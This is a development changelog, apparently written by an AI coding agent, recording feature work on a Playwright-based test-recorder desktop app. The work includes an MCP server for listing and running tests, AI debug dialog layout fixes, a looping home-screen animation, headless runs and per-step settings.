**Goal:** Let external MCP clients (Claude Code, Codex, etc.) list/view recorded tests and run history, and trigger test runs, without the app needing to be open.

**What was done:** Created `mcp/server.mjs` (standalone stdio MCP server, name `good-looks`) + `mcp/glaze-data.mjs` (userData dir resolution, copied verbatim per the MCP skill). Installed `@modelcontextprotocol/sdk` + `zod@^3`. Registered 5 tools: `list_tests`, `get_test`, `list_runs`, `get_run_log`, `run_test`. Registered the server in this project's `.mcp.json` for the Glaze agent; gave the user the `claude mcp add --scope user` command for their own Claude Code.

**Key decisions:** User chose "Full control" (read + trigger runs) over read-only when asked about scope. `run_test` reimplements the relevant slice of `playwright-runner.ts` (CLI/browsers-path resolution, node_modules symlink, minimal `playwright.config.ts`) standalone rather than importing `main/` code (forbidden — mcp/ is a separate process). It refuses to run and returns a clear error if Chromium isn't installed yet, rather than silently downloading it. Successful runs append a real `RunRecord` + log file so they appear in the app's own Stats view too — last-write-wins if the app is open at the same time.

**UI elements:** none (backend/tooling only).
**Backend elements:** ipc_handler-equivalent (MCP tools), local_storage (reads/writes `userData/recorder/tests.json` and `run-history.json`), external CLI invocation (bundled Playwright).

**Corrections/Lessons Learned:** none — first pass verified clean via the protocol smoke test (initialize, tools/list, and three real tool calls against the user's actual test data).

**User Frustrations & Important Remarks:** none.

### 2026-08-04 — Set empty-state description padding to 60px 0px
- **What was done:** In `renderer/main/home-view.tsx`, replaced the `EmptyStateDescription` wrapper with a plain `<p className="text-regular" style={{ padding: "60px 0px" }}>` so the description paragraph has 60px vertical padding (0px horizontal). Removed the now-unused `EmptyStateDescription` import.

### 2026-08-04 — Changed empty-state title to "GOOD LOOKS!" at 54px
- **What was done:** In `renderer/main/home-view.tsx`, replaced the `EmptyStateTitle` component (which renders `h1.text-heading1` at 24px) with a plain `<h1 className="text-heading1" style={{ fontSize: "54px" }}>GOOD LOOKS!</h1>` so the text and size can be set explicitly. Removed the now-unused `EmptyStateTitle` import.

### 2026-08-04 — Added vertical padding to AI debug prose paragraphs (fix clipping)
- **Goal:** The model output prose paragraphs in the AI debug dialog (`AiDebugDialog` and `StepAiDebugDialog`) were visually clipped/cut off at the container edges — no internal vertical padding, text ran right up to the borders.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`, added `py-1` to the prose `<p>` elements in both the `AiDebugDialog` response phase (line ~651) and the `StepAiDebugDialog` response phase (line ~871) so the text has vertical breathing room inside its container.

### 2026-08-04 — Added follow-up reply to AI debug dialog for when the model asks for more info
- **Goal:** When the local LLM's debug diagnosis asks the user for more information (per its system-prompt instruction to request more detail rather than guess), let the user type a follow-up and send it back without leaving the dialog.
- **What was done:** In `renderer/main/ai-debug-panel.tsx` (`AiDebugDialog`), added a `messagesRef` tracking the sent message array and a `followUp` state. `sendDiagnosis` now stores the sent messages into `messagesRef`. A new `sendFollowUp` callback appends `{role:"assistant", content}` (the streamed response) + `{role:"user", content: trimmed}` (the user's reply) to `messagesRef` and calls `start` with the full thread so the model keeps the back-and-forth context. Added a follow-up input row (Textarea + accent "Send" button, Enter to send / Shift+Enter for newline) below the response ScrollArea, shown only when `status === "done" && content` (model finished answering). Reset on new-run open. Imported `LlmMessage` type.
- **Key decisions:** Follow-up is only visible after a completed (non-streaming) response; it re-sends the whole conversation (not a bare continuation) since `useLlmChat.start` always begins a fresh request. The `StepAiDebugDialog` was not changed (leaner sibling, no follow-up yet).
- **UI elements:** AI debug dialog response phase (AiDebugDialog). **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Moved quick-context chips AND "Anything else?" field above System/User prompts in AI debug review
- **Goal:** Move both the quick-context button group (Flaky selector, etc.) and the "Anything else you want to include? (Optional)" Textarea so they appear above the System and User Prompts in the AI debug dialog's review phase, while keeping the prompts fully scrollable.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`, the review phase now renders in this order: (1) the `QUICK_CONTEXT_REASONS` chips as a `flex-wrap` row, (2) the `Field` with the "Anything else you want to include? (Optional)" Textarea, (3) the `ScrollArea` containing the System/User prompts. The ScrollArea uses `flex-1 min-h-0` with `viewportClassName="max-h-[44vh]"` so the prompts stay fully scrollable and the dialog flexes to fill remaining height.
- **Key decisions:** Both the chips and the textarea now sit above the scrollable prompts; the ScrollArea is the flex child that absorbs leftover height so the prompts remain scrollable within the dialog.
- **UI elements:** AI debug dialog review phase (AiDebugDialog). **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Moved quick-context chips above System/User prompts in AI debug review
- **Goal:** Move the quick-context button group (Flaky selector, etc.) so it appears above the System and User Prompts in the AI debug dialog's review phase, while keeping the prompts scrollable.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`, extracted the `QUICK_CONTEXT_REASONS` button group out of the `Field` label (where it sat beside the "Anything else you want to include?" text, below the prompts) and placed it as a standalone flex-wrap row above the `ScrollArea` containing the System/User prompts. The `Field` label now holds only the plain "Anything else you want to include? (Optional)" text. The ScrollArea retains its `max-h-[44vh]` so the prompts stay fully scrollable.
- **Key decisions:** Kept the chips as `flex-wrap` so they reflow on narrow widths; left the Textarea/Field below the prompts unchanged.
- **UI elements:** AI debug dialog review phase (AiDebugDialog). **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Removed color fill on Stop button in AI debug dialogs
- **Goal:** Remove the red color fill from the Stop button in the AI debug dialogs.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`, changed both Stop buttons (in the test-level and step-level debug dialogs) from `variant="destructive"` (red fill) to `variant="muted"` to match the Regenerate button style.
- **Key decisions:** Both Stop buttons had identical styling; updated both for consistency.
- **UI elements:** Stop buttons in AI debug dialog headers. **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Centered thinking gif, set 50% opacity
- **Goal:** Center the glitch gif in the AI debug dialog and set its opacity to 50%.
- **What was done:** In `renderer/main/ai-debug-panel.tsx` `ThinkingGifOverlay`, changed the gif container from `items-start justify-center pt-4` (top-anchored) to `items-center justify-center` (fully centered). Changed the streaming target opacity from `1` to `0.5`.
- **Key decisions:** Removed the `pt-4` top padding since centering makes it unnecessary. The 5s ease-in / 0.5s ease-out transitions are unchanged.
- **UI elements:** ThinkingGifOverlay in both AI debug dialogs. **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Enhanced failed-step highlighting in Steps list
- **Goal:** When a test run fails, the failed step should be clearly highlighted in the Steps tab.
- **What was done:** In `renderer/main/step-row.tsx`, enhanced the `runStatus === "failed"` highlight from a subtle `bg-support-red-10` (10% red tint) to `bg-support-red/15 ring-1 ring-inset ring-support-red/40` (15% red background + 40% red ring border). Also made the failed step's description text red (`text-support-red` class on the Text) and enlarged the X icon from `size-3.5` to `size-4` for failed steps.
- **Key decisions:** Used Tailwind `/` opacity syntax (`support-red/15`, `support-red/40`) for reliable opacity control. The combination of red background + red ring + red text + larger X icon makes the failed step unambiguously stand out from passing/unhighlighted steps.
- **UI elements:** StepRow in test detail view Steps tab. **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Reverted gif size, enlarged dialog instead, gif top-anchored with response filling below
- **Goal:** User wanted the gif size change reverted — instead, enlarge the dialog box to accommodate the gif, and let the model's streaming response fill the empty space gradually. Gif shouldn't be too big.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`: (1) Reverted the gif `minWidth/minHeight: 350%` — the `<img>` is now `max-h-[300px] max-w-[400px] object-contain` (moderate, capped size). (2) Enlarged both dialogs from `size="xl"` (750px) to `size="2xl"` (900px). (3) Content container changed from `max-h-[50vh]` to `min-h-[400px] max-h-[70vh]` so the dialog is tall enough for the gif + response. (4) Gif overlay inner flex changed from `items-center` to `items-start justify-center pt-4` so the gif sits at the top of the content area, leaving space below for the streaming response to fill in. (5) Response ScrollArea max-heights increased (review 32vh→44vh, response 40vh→56vh, step 42vh→56vh) to use the taller dialog. The opacity-based fade animation is kept from the prior change.
- **Key decisions:** Capped the gif at 300×400px so it's prominent but not dominating. Top-anchored the gif so the response text naturally fills the space below it as it streams in. The dialog grows from 400px min to 70vh max as content arrives.
- **UI elements:** ThinkingGifOverlay + both AI debug dialogs (AiDebugDialog, StepAiDebugDialog). **Backend elements:** none.
- **Corrections/Lessons Learned:** The gif must be capped with `max-h/max-w` (not `h-full w-full`) when the dialog is tall — otherwise `object-contain` fills the entire container, making the gif dominate. Top-anchoring (`items-start` + `pt-4`) is needed so the response fills below, not centered around the gif.

### 2026-08-04 — Enlarged thinking GIF + fade-out instead of flip
- **Goal:** User wanted the AI debug dialog's thinking GIF to be 250% larger (minimum size) and to fade out via opacity instead of flipping via scaleX when the response arrives.
- **What was done:** In `renderer/main/ai-debug-panel.tsx` `ThinkingGifOverlay`: (1) replaced `h-full w-full` on the `<img>` with `minWidth: "350%"` + `minHeight: "350%"` inline styles (250% larger than the original 100% fill = 350% total), keeping `object-contain`; (2) replaced the `scaleX(0)→scaleX(1)` transform animation with `opacity 0→1` fade — the `scaledIn` state became `fadedIn`, `targetScale` became `targetOpacity`, and the `transition` now animates `opacity` instead of `transform`. The contracting phase (response received) fades opacity to 0 over 0.5s instead of flipping via scaleX(0). Applies to both `AiDebugDialog` and `StepAiDebugDialog` since both render the same `ThinkingGifOverlay` component.
- **Key decisions:** Kept the 5s ease-in for expanding (fade-in) and 0.5s ease-out for contracting (fade-out) — same timing as before, just opacity instead of transform. Used `min-width/min-height` instead of `width/height` so the gif can still grow beyond 350% if the container is tiny.
- **UI elements:** ThinkingGifOverlay in both AI debug dialogs. **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Moved Stop button next to test name in AI debug dialog (red when stoppable)
- **Goal:** User wanted the Stop button moved next to the Test name in the AI debug dialog header, highlighted red while the model is in a stoppable (streaming) state.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`, moved the Stop button out of the response-phase status row and into the `Dialog` `description` prop (which renders the test name) for both `AiDebugDialog` (description was `testName`) and `StepAiDebugDialog` (description was `stepLabel`). The description is now a `span.inline-flex.items-center.gap-2` containing the name + a Stop button that only renders when `status === "streaming"`, using `variant="destructive"` (red). Removed the old Stop button from the status row; the Regenerate button now always renders there (no streaming/done conditional).
- **Key decisions:** Used `variant="destructive"` for the red highlight. Kept Regenerate always visible in the status row since Stop is now in the header.
- **UI elements:** AiDebugDialog + StepAiDebugDialog header description area + status row. **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Fixed AI debug dialog prompt overflow (content rendered on top of input field)
- **Goal:** In the AI debug dialog review phase, the long prompt `pre` block overflowed its ScrollArea and rendered on top of the input field below.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`, added `overflow-hidden` to all three ScrollArea roots (review `max-h-[32vh]`, response `max-h-[40vh]`, step `max-h-[42vh]`). The Radix ScrollArea root had `overflow: visible` by default, so the viewport (with `size-full` / `h-full`) spilled out to its full content height (1560px) instead of being clipped to the `max-h` constraint. Also added `overflow-x-auto` to the prompt `pre` blocks and error `pre` blocks for horizontal scroll on long lines.
- **Key decisions:** `overflow-hidden` on the ScrollArea root is the essential fix — it clips the viewport to the `max-h` bound. The `overflow-x-auto` on `pre` blocks prevents horizontal overflow of long unbreakable lines.
- **UI elements:** AiDebugDialog review + response phases, StepAiDebugDialog response phase. **Backend elements:** none.
- **Corrections/Lessons Learned:** The Glaze `ScrollArea` root defaults to `overflow: visible`. When using `max-h` to bound a ScrollArea, always add `overflow-hidden` to the className — otherwise the inner viewport (which has `size-full` and resolves `h-full` to content height) overflows the max-height constraint and spills into adjacent UI.

### 2026-08-04 — Fixed AI debug dialog scroll (content overflowed beyond viewport)
- **Goal:** User couldn't scroll the full length of the "Debugging with AI" dialog.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`, both `AiDebugDialog` and `StepAiDebugDialog` used `h-[50vh]` (fixed height) on the outer content wrapper with `overflow: visible`, while the inner `ScrollArea` components used `min-h-0 flex-1`. The ScrollArea component adds `h-full max-h-screen` when it has a vertical scrollbar, and `h-full` resolved to the full window height (1410px) instead of the flex-computed height — making the content overflow to ~1688px inside a 705px container, requiring 982px of scroll in the DialogBody's ScrollArea. Changed `h-[50vh]` → `max-h-[50vh]` (container shrinks to fit) and replaced `min-h-0 flex-1` on the inner ScrollAreas with bounded `max-h-[32vh]`/`max-h-[40vh]`/`max-h-[42vh]` so they scroll within a reasonable bound instead of expanding to window height.
- **Key decisions:** Used `max-h` instead of fixed `h` on both the outer wrapper and inner ScrollAreas — avoids the `h-full` resolution issue entirely since the ScrollArea no longer tries to fill a flex parent that has a definite height.
- **UI elements:** AiDebugDialog (review + response phases), StepAiDebugDialog (response phase). **Backend elements:** none.
- **Corrections/Lessons Learned:** The Glaze `ScrollArea` component adds `h-full max-h-screen` when it detects a vertical scrollbar. In a flex-column parent with a fixed height, `h-full` (height: 100%) can resolve to the full window height rather than the flex-computed height, causing massive overflow. Use `max-h` on ScrollAreas inside fixed-height flex containers instead of `flex-1`.

### 2026-08-04 — Removed run-level "Accept All & Re-baseline" from visual diffs
- **Goal:** User wants re-baselining to happen only at the test-step level, and only when a step's visual change meets or exceeds the configured threshold — no more run-wide "Accept All" scope.
- **What was done:** In `renderer/main/visual-view.tsx`, removed the `acceptRun` mutation and both "Accept All & Re-baseline" `AlertDialog` triggers (the header one next to `ThresholdControl`, and the `actions` prop of the visual-change `Callout`). The `Callout` now just tells the user to use the per-step button. Tightened the per-step "Accept New Baseline" button condition from `step.screenshot && !acceptedSteps.has(step.stepId)` to `step.screenshot && step.diff?.state === "changed" && !acceptedSteps.has(step.stepId)` — so the button only appears when the step's diff exceeded the threshold (state `"changed"`), not for any captured step. Removed the now-unused `screenshotCount` local. The backend `visual:acceptRun` IPC handler and `api.visual.acceptRun` wrapper are left in place (harmless, no longer called from the UI).
- **Key decisions:** Kept the backend `acceptRun` handler rather than removing it — surgical UI-only change, and leaving it avoids touching the IPC layer. The `"changed"` diff state already encodes "over threshold" (vs `"match"` = within threshold), so no threshold comparison was needed in the UI.
- **UI elements:** visual diff view header + visual-change banner + per-step footer button. **Backend elements:** none.
- **Corrections/Lessons Learned:** None.

### 2026-08-04 — Re-ported black-hole animation tweaks from a re-exported Dark Mode zip
- **Goal:** User said they "made some adjustments" and attached a re-exported "Black Hole Loading Animation (Dark Mode).zip"; twice in a row asked to "repeat that same procedure" to pick up new tweaks.
- **What was done:** Byte-diffed the new zip's extracted files against the previous zip attachment on disk (not just against the already-ported `.tsx`, since a first attempt with identical content had been a stale re-export). `hand-ink3.png`, `support.js`, and all `uploads/*` images were identical; only `OkeeDokee Loader.dc.html` changed. The diff removed the hole-shadow radial gradient + ellipse entirely and added a `lineThickness` prop that multiplies ring and spoke stroke-widths, plus new prop defaults (loopSeconds 3→1.5, swirl 0.8→0, depth 420→380, steepness 3.1→7, ringCount 18→9, spokeCount 18→30). Ported all of this into `black-hole-loader.tsx`: dropped `HOLE_SHADOW`/`shadowRef`/the gradient defs/the shadow ellipse, added `LINE_THICKNESS = 1` applied to both ring stroke-width (`sw`) and spoke stroke-width (now set every frame instead of once at creation), and updated the `LOOP_SECONDS`/`SWIRL`/`DEPTH`/`STEEPNESS`/`RING_COUNT`/`SPOKE_COUNT` constants to the new defaults.
- **Key decisions:** Diffed the new zip against the prior zip attachment (found via the other `user-attachments` UUIDs on disk with matching filenames), not just against already-ported code — this is what caught the change the first "repeat" attempt missed (that first attachment turned out to be a stale re-export with no actual diff).
- **UI elements:** home screen animation (line thickness, ring/spoke density, motion timing changed). **Backend elements:** none.
- **Corrections/Lessons Learned:** When the user says they "made adjustments" to a re-exported OkeeDokee zip, diff the new zip against the most recent prior zip attachment byte-for-byte (all files, not just the PNGs) rather than assuming the whole export is unchanged just because the images match — the actual delta lives in the `.dc.html` script/props, not the assets.

### 2026-08-04 — Dark-mode variant + doubled size + Settings toggle for the black-hole animation
- **Goal:** User attached a second export ("Black Hole Loading Animation (Dark Mode).zip") and asked for it to render when the app theme IS dark mode, the original to render when it's NOT, both animations doubled in size on the home screen, and the whole feature filed under "Aesthetic Enhancements" in Settings.
- **What was done:** Diffed both OkeeDokee exports byte-for-byte — only stroke color, hand-ink image, hand-clip percentages, and `ix/iy/iw/ih` constants differ (`support.js` runtime and all animation math are identical) — so `black-hole-loader.tsx` gained a `VARIANTS` map and a `dark` prop instead of a second component. Copied the dark export's hand image to `renderer/main/assets/hand-ink-dark.png`. `home-view.tsx` now passes `dark={useTheme()}` and `size={440}` (was 220) and wraps the animation in a `useDisabledEnhancements().has("homeBlackHole")` gate. Extracted the existing `ai-debug-panel.tsx` inline hook into shared `renderer/lib/use-disabled-enhancements.ts`. Added a "Home screen animation" `Switch` under Settings → Aesthetic Enhancements, reusing the existing `disabledAestheticEnhancements`/`handleToggleEnhancement` mechanism with feature ID `homeBlackHole`.
- **Key decisions:** Parameterized one component over duplicating it, since only 4 small values differ between variants. Reused the generic disabled-enhancements array (no new settings field needed) since it already supports arbitrary string IDs.
- **UI elements:** home screen animation (light/dark variant, doubled size), Settings toggle. **Backend elements:** none (existing `disabledAestheticEnhancements` mechanism reused as-is).
- **Corrections/Lessons Learned:** Verified live in the running app by toggling the Settings theme radio (Light/Dark) and confirming the main window's animation swapped variants and stayed at 440px in both — then restored the theme radio back to its original "Auto" setting afterward, since the switch was only for verification, not a requested change.

### 2026-08-04 — Looping black-hole animation on the home screen
- **Goal:** User attached an exported animation ("Black Hole Loading Animation.zip") and asked for it to play as a loop when the app first opens, with the existing home text centered above it with padding.
- **What was done:** The zip was an OkeeDokee "dc" export — a `<script data-dc-script>` React class component plus a runtime (`support.js`) that loads React/ReactDOM/Babel from unpkg.com at runtime. Rather than embedding that (network dependency, heavy Babel runtime), ported the animation's draw logic verbatim into a plain, dependency-free React component, `renderer/main/black-hole-loader.tsx` (`BlackHoleLoader`) — refs + `requestAnimationFrame`, procedurally drawn SVG rings/spokes forming a funnel, with a hand-ink PNG (`renderer/main/assets/hand-ink.png`) masked/clipped over it. Rewrote `home-view.tsx` (`/` route) to drop the single-prop `EmptyState` component in favor of `EmptyStateTitle`/`EmptyStateDescription` composed directly above `BlackHoleLoader`, since `EmptyState`'s `media` slot renders above the title (wrong order for this request).
- **Key decisions:** Kept the animation config values (loop duration, swirl, ring/spoke counts, etc.) as the export's defaults, hardcoded as constants rather than exposing them as props — nothing in the app varies them. Verified via a live preview capture that the running app shows text centered above the looping animation with clear padding.

### 2026-08-03 — Annotation Edit/Clear buttons → icons; Tags column reverted
- **Goal:** Revert the Tags column icon-only change (restore text+icon badges). Replace the annotation "Edit" and "Clear" text buttons in `visual-view.tsx` with icon-only buttons (Pencil / X) + tooltips, shown only when an annotation is present.
- **What was done:** In `stats-view.tsx`, restored the `Headless`/`Browser` text labels next to the icons in Tags badges. In `visual-view.tsx` annotation display block (line ~358), replaced the two text `Button`s with `Pencil`/`X` icon buttons wrapped in `Tooltip`/`TooltipTrigger`/`TooltipContent`. Added `Pencil` to the lucide-react imports.

### 2026-08-03 — Tags column in Stats run history
- **Goal:** Add a "Tags" column to the Stats → Run history table (left of Duration) showing "Browser" or "Headless" per run. Backfill all existing runs. Eventually filterable, but not yet.
- **What was done:** Added `runHeadless?: boolean` to `RunRecord` (both `main/recorder/types.ts` + `renderer/lib/recorder-types.ts`). Plumbed the flag through the run chain: `recorder-store.tsx` → `api.runner.run` → `runner:run` IPC handler → `playwrightRunner.start` → `runHistoryStore.append`. The Stats table (`stats-view.tsx`) now has a Tags column (with `Globe`/`MonitorOff` icons) between Started and Duration; baseline-update rows show "—". Existing runs without the field default to `false` (Browser) since all prior runs were headed (the headless toggle was only recently added).
- **Key decisions:** `runHeadless` defaults to `false` for backfill — correct because the headless toggle is new and all historical runs were headed. The `append` input type and `RunRecord` both carry the optional field so old persisted records deserialize without migration.

### 2026-08-03 — Headless mode for test runs (runs only, not trainer)
- **Goal:** Let the user enable headless browser mode for test RUNS, kept out of the trainer / "Edit App" areas.
- **What was done:** Added `runHeadless?` to `TestRecord` + `defaultRunHeadless: boolean` to `RecorderSettings` (both `main/recorder/types.ts` + renderer mirrors). Persisted the global default in `recorder-settings-store.ts` (DEFAULT/read/set/logger). New `tests:setHeadless` handler + `api.tests.setHeadless`. Threaded a `headless` arg through `run()` in `recorder-store.tsx` → `api.runner.run(id, !headless, captureArtifacts)` (headed = not headless; runner already appends `--headed` only when true). UI mirrors the "Capture screenshots" pattern exactly: a per-test "Run headless" `Checkbox` in `test-detail-view.tsx` (init from `test.runHeadless ?? defaultRunHeadless`) + a global "Run tests in headless mode" `Switch` in `settings-view.tsx`'s run FieldSet.
- **Key decisions:** Runs-only by construction — only `runner:*` path touched; `recorder:*` trainer/replay code left alone (trainer is always headed). Both a global default AND a per-test override (user chose "Both"). Default false (headed) preserves current behavior.
- **UI elements:** toolbar checkbox, Settings switch. **Backend elements:** ipc_handler (`tests:setHeadless`), local_storage (`recorder-settings.json`, `tests.json`), playwright runner flag.
- **Corrections/Lessons Learned:** The `headed` flag was already threaded end-to-end (`runner:run` → `playwrightRunner.start` → `--headed`); only the renderer's hardcoded `true` needed replacing — no backend runner change.

### 2026-08-03 — Inline diff in AiDebugDialog response phase
- **Goal:** The "Apply to script" button opened a separate `AlertDialog` showing the `DiffView`. The user wanted the diff shown inline in the response phase to avoid an extra click.
- **What was done:** In `ai-debug-panel.tsx`, replaced the `AlertDialog` (trigger + confirm dialog) with a direct "Apply" button in the response toolbar, and rendered the `DiffView` inline at the bottom of the response `ScrollArea` (with a "Suggested changes (+N / -M lines)" header) when a corrected script is detected. Removed the now-unused `AlertDialog` import.
- **Key decisions:** The diff lives inside the same `ScrollArea` as the AI prose so it scrolls with the response. The apply action is a single click on the toolbar button — no confirmation dialog. The `StepAiDebugDialog` was not changed (it has no apply/diff flow).

### 2026-08-03 — Fix: bottom gradient overlapping Send to AI button
- **Goal:** The Dialog component's `DialogBody` wraps children in a `ScrollArea` with `fadeEdges` (hardcoded, no prop to disable). When the AiDebugDialog review-phase content overflowed, the 32px bottom fade mask overlapped the "Send to AI" / "Cancel" button row at the bottom.
- **What was done:** Added `pb-8` (32px = the fade size) to the button row in `ai-debug-panel.tsx` so there's empty space below the buttons for the fade to cover. This also made the content fit without overflow in most cases, so the fade doesn't trigger at all.
- **Key decisions:** `pb-8` matches the `fadeSize = 32` constant in the ScrollArea component, so the fade zone covers only the padding, not the buttons.

### 2026-08-03 — Aesthetic Enhancement: full-bleed scaling gif overlay
- **Goal:** Scale the glitch gif to fill the entire debug dialog window with a 5s ease-in when the model starts processing, and scale it back out with a 5s ease-out when the response arrives. Window background = #000000 while the gif is active or transitioning. All window text must stay visible on top. Replaces the prior centered-64px gif.
- **What was done:** Added a `ThinkingGifOverlay` component in `ai-debug-panel.tsx` — an absolutely-positioned `#000000` overlay (`z-0`) behind the dialog content (`z-10`). The gif uses `h-full w-full object-contain` with `transform: scaleX(0→1)` and `transition: transform 5s ease-in-out`. A `phase` state machine (`hidden` → `expanding` → `contracting` → `hidden`) driven by `status` changes starts/stops the animation. A `requestAnimationFrame` double-frame ensures the browser sees `scaleX(0)` before `scaleX(1)` so the transition actually animates. A `phaseRef` avoids re-triggering the effect when `phase` changes. Both `AiDebugDialog` and `StepAiDebugDialog` wrap their content in `relative z-10` and render the overlay as a sibling. The old inline header gif, centered-64px gif, and border-hiding logic were removed. Settings description updated to describe the new behavior. The `disabledAestheticEnhancements`/`aiThinkingGif` toggle from the prior turn still gates the whole overlay.
- **Key decisions:** `scaleX` (not `scale`) so the gif grows horizontally from center, keeping height constant. `object-contain` so the 800×600 gif fits the dialog area without distortion. `pointer-events-none` on the overlay so buttons/links in the text layer remain clickable. The overlay covers the dialog body (the `h-[50vh]` content area), not the title bar (which is outside the app's control in the Dialog component).
- **Corrections/Lessons Learned:** Initial attempt without `requestAnimationFrame` jumped to full scale instantly (React rendered `scaleX(1)` on first mount with no prior state to transition from). Adding `phase` to the effect deps caused a re-run loop that reset `scaledIn` — fixed by using a `phaseRef` and removing `phase` from deps. Verified mid-transition at `scaleX(0.73)` via `getComputedStyle` + screenshot showing ~75% width centered gif with black background and visible text.

### 2026-08-03 — Aesthetic Enhancement: centered gif + Settings toggle
- **Goal:** When the model is running in the AI debug dialogs, hide the content-area border and show the glitch gif centered at a larger size (instead of the small inline header gif). Make this an "Aesthetic Enhancement Feature" the user can disable in Settings, with more feature types coming.
- **What was done:** Added `disabledAestheticEnhancements: string[]` to `RecorderSettings` (both `main/recorder/types.ts` + `renderer/lib/recorder-types.ts`, default `[]` = all enabled). `recorder-settings-store.ts` validates/persists it. Settings view (`settings-view.tsx`) adds a new "Aesthetic Enhancements" FieldSet with an "AI thinking gif" Switch (ON by default). In `ai-debug-panel.tsx`, a `useDisabledEnhancements` hook loads the setting; both `AiDebugDialog` and `StepAiDebugDialog` check `thinkingGifEnabled`. When enabled + streaming: the `ScrollArea` border is hidden and the content placeholder shows the gif centered at `size-16` (64px) instead of the "Thinking…" text; the small inline header gif is suppressed. When disabled: reverts to the prior behavior (small inline header gif + bordered content area with "Thinking…" placeholder).
- **Key decisions:** Feature ID `"aiThinkingGif"` stored in the `disabledAestheticEnhancements` array — designed as an extensible list so future aesthetic features just add new IDs + toggles. The Settings FieldSet has a section-level description ("Optional visual flourishes…") plus per-feature rows, ready for more entries.

### 2026-08-03 — "Thinking" gif in AI debug dialogs
- **Goal:** Show a user-provided gif while the local LLM is processing/generating in the AI debug flow.
- **What was done:** Copied the attached `Glitch.gif` to `renderer/main/assets/glitch.gif` and imported it in `renderer/main/ai-debug-panel.tsx`. Added a `<img src={glitchGif} className="size-5 shrink-0 rounded-sm" />` next to the existing `<Status variant="loading">Thinking…</Status>` pill in both `AiDebugDialog` (full-run) and `StepAiDebugDialog` (per-step) — both gated on the same `status === "streaming"` condition, so the gif is visible the whole time the model is processing the prompt and streaming its response, not just an initial "waiting" phase.
- **Key decisions:** Static image assets for this app live at `renderer/main/assets/` (component-scoped) per the app guide's Vite asset-import convention; imported via `import glitchGif from "./assets/glitch.gif"` rather than a public/ path.
- **Corrections/Lessons Learned:** Verification note — re-running the "Debug Dialog Test" against the live ritual.com site to force a fresh failed run wasn't reliable (the site passed on retry, no guaranteed repro), so this was verified by code inspection + successful build (asset import resolves) rather than a fresh live-failure repro; the identical `status === "streaming"` gate was already confirmed rendering correctly for the sibling "Thinking" Status pill in the prior session.

### 2026-08-03 — Quick-select context chips in AI debug dialog
- **Goal:** In the AI debug dialog's "Anything else you want to include? (Optional)" field, add pre-filled toggle chips for common failure reasons (flaky selector, wrong A/B variant, timing/race, site changed, auth/login) so users don't retype them. Chips sit in-line with the label, right-aligned.
- **What was done:** In `renderer/main/ai-debug-panel.tsx`, added `QUICK_CONTEXT_REASONS` (5 strings) + `isReasonActive`/`toggleReason` helpers that append/remove each reason as a `- <reason>` line in `additionalContext`. The `Field` `label` prop is now a flex row: label text on the left, the 5 chips (`Button` size="small" variant toggling `muted`/`transparent`, `radius="full"`, `h-6`) on the right. Clicking a chip toggles its reason in/out of the textarea. Verified in the running app: chips render in-line with the label (wrap to 2 rows in the narrow dialog), toggle on/off correctly, textarea stays intact.

### 2026-08-03 — Sidebar test-row icons use the site's favicon
- **Goal:** Replace the generic Lucide `FlaskConical` icon on each sidebar test row with the recorded website's favicon.
- **What was done:** In `renderer/main/library-sidebar.tsx`, added a `Favicon` component that renders an `<img>` pointing at Google's S2 favicon service (`https://www.google.com/s2/favicons?domain=<host>&sz=64`) in a 16px (`size-4`) box, falling back to `FlaskConical` on load error. `SidebarListItem icon` now uses `<Favicon url={t.url} />` instead of the flask. The CSP (`main-window.html`) already allows `img-src https:`, so no CSP change needed. The Stats/Visual rows under "Views" keep their Lucide icons. Note: S2 returns a generic placeholder (a colored circle) for domains it has no cached favicon for — that's the service's behavior, not a bug; the flask fallback only fires on an actual load error (offline, malformed URL).

### 2026-08-03 — Persist "Capture screenshots" per-test + Settings default
- **Goal:** Make the test-detail toolbar's "Capture screenshots" toggle persist between sessions at the test level, and add a global default preference in Settings.
- **What was done:** Added `captureArtifacts?: boolean` to `TestRecord` (both `main/recorder/types.ts` and `renderer/lib/recorder-types.ts`) and `defaultCaptureArtifacts: boolean` to `RecorderSettings` (both mirrors). `recorder-settings-store.ts` persists the default (default false). New IPC handler `tests:setCaptureArtifacts` + `api.tests.setCaptureArtifacts` persist the per-test choice. `test-detail-view.tsx` initializes the toggle from `test.captureArtifacts ?? settings.defaultCaptureArtifacts` (via a `recorder-settings` query) and persists on change. New recordings (`recorder-service.ts`) and prompt-generated tests (`tests:createFromPrompt`) seed `captureArtifacts` from the global default. Settings view adds a "Capture screenshots by default" switch in the Trainer settings section.

### 2026-08-03 — "Disable Step" option in the step-row kebab menu
- **Goal:** Add a per-step "Disable Step" toggle in the "Step utilities" kebab menu. When enabled, the runner skips the step (logging it was skipped because disabled) and the generated spec emits the step's line commented out. The step stays in the list and keeps its index/position (no reindexing).
- **Why keep the index:** Steps are keyed by stable `step.id` (UUIDs); `failedAtIndex`, `stepStatus` (keyed by array index), visual baselines (pinned under `stepId`), and `if`/`endif` block matching (`matchingBlockIndex`) all assume stable positions. Removing a disabled step would shift indices and orphan baselines / break block pairing. Keeping the step in place and skipping it at runtime (like `if` blocks skip their body) touches none of that — far lower risk.
